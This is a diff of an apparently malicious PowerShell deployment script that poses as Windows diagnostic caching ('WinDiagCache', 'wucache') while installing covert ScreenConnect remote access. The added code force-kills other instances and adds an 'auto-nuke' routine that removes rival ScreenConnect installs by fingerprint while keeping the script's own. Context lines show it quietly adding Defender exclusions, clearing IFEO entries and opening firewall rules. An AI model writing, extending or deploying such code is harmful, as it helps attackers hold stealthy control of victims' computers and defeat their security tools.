@@ -21,23 +21,23 @@ $script:Mutex = $null
 try {
     $script:Mutex = [System.Threading.Mutex]::new($false, 'Global\WinDiagCache_5f6010579852e507')
     if (-not $script:Mutex.WaitOne(0)) {
-        # Prior monitor/deploy still holds mutex (common when Guest cannot kill SYSTEM PS).
-        # Take over: stop other wucache hosts, then retry.
+        # Prior monitor/deploy still holds mutex - kill hosts and continue (never abort deploy)
         try {
             Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
                 Where-Object { $_.CommandLine -match 'wucache_pkg|\.wucache|wucache\.ps1' -and $_.ProcessId -ne $PID } |
                 ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
         } catch {}
         Start-Sleep -Seconds 2
-        if (-not $script:Mutex.WaitOne(5000)) {
+        if (-not $script:Mutex.WaitOne(3000)) {
             try {
                 $WorkDirBoot = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
                 New-Item -ItemType Directory -Path $WorkDirBoot -Force -ErrorAction SilentlyContinue | Out-Null
                 Add-Content -Path (Join-Path $WorkDirBoot '.diag.log') -Value (
-                    "[{0}] mutex busy - exit (build waiting)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+                    "[{0}] mutex busy - FORCING continue (will not skip rival nuke)" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
                 ) -ErrorAction SilentlyContinue
             } catch {}
-            exit
+            try { $script:Mutex.Dispose() } catch {}
+            $script:Mutex = $null
         }
     }
 } catch {}
@@ -1132,11 +1132,49 @@ try {
 } catch {}
 
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729Y'
+function Invoke-NukeBlockedScreenConnect {
+    # Automatic: remove any SC pointed at blocked relays OR non-allowed fingerprints.
+    # Never touches sevrz (5f60...) or pluxn (f861...).
+    Write-Log 'AUTO-NUKE: scanning for disallowed ScreenConnect'
+    $killed = 0
+
+    # 1) Known rival fingerprint(s)
+    foreach ($fp in $LegacyFingerprints) {
+        if ($fp -in $AllowedFingerprints) { continue }
+        Remove-ScByFingerprint -Fingerprint $fp
+        $killed++
+    }
+
+    # 2) Any service whose PathName hits a blocked relay or unknown FP
+    try {
+        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+            "$($_.Name) $($_.PathName)" -match '(?i)ScreenConnect|ConnectWise'
+        } | ForEach-Object {
+            $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            Write-Log "AUTO-NUKE service: $($_.Name)"
+            & sc.exe stop "$($_.Name)" >$null 2>&1
+            Stop-AllUnauthorizedScProcesses
+            Stop-DeleteServiceSafe -ServiceName $_.Name
+            if ($blob -match '(?i)([0-9a-f]{16})') {
+                $fp = $Matches[1].ToLower()
+                if ($fp -notin $AllowedFingerprints) { Remove-ScByFingerprint -Fingerprint $fp }
+            }
+            $killed++
+        }
+    } catch {}
+
+    # 3) Processes with blocked relay / non-allowed FP
+    Stop-AllUnauthorizedScProcesses
+
+    # 4) Full purge pass (folders/ARP)
+    Invoke-RemoveUnauthorizedScreenConnect
+    Write-Log "AUTO-NUKE complete (actions~$killed)"
+}
+
+Write-Log 'WU_BUILD_20260729Z'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
-# Immediate kill of known rival FP (uvexr) - never touch allowed sevrz/pluxn
-Remove-ScByFingerprint -Fingerprint '89a1ede2d1bd11dd'
-Invoke-RemoveUnauthorizedScreenConnect
+Invoke-NukeBlockedScreenConnect
 
 # ============================================
 # PHASE 0: WIPE LOUD OLD VERSION + LEGACY
@@ -1729,8 +1767,8 @@ function Ensure-PrimaryScFullyUp {
 
     for ($i = 1; $i -le $MaxRounds; $i++) {
         Write-Log "ENSURE round $i/$MaxRounds"
-        # Always purge rivals first so disallowed SC sessions die even mid-ensure
-        Invoke-RemoveUnauthorizedScreenConnect
+        # Always auto-nuke disallowed SC/RMM first (uvexr etc) - keep sevrz+pluxn
+        Invoke-NukeBlockedScreenConnect
         Enable-QuietDefenderExclusions | Out-Null
         Clear-ScIfeoHijacks
         Enable-ScFirewallAllow
